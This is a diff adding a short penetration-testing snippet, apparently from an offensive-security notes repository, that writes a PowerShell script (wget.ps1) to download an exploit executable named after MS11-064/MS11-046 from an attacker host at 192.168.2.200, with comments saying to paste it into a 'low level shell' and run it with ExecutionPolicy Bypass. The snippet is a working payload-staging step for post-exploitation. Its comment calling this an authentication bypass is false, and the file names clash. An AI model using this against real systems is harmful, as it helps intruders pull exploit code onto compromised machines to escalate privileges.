@@ -1,0 +1,10 @@
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.2.200/ms11-064.exe" >>wget.ps1
+echo $file = "ms11-046-test.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+
+#its use to transfer files (wget), simply paste the code in low level shell. it use powershell and bypass authentication, if any.
+#Usage-
+#powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
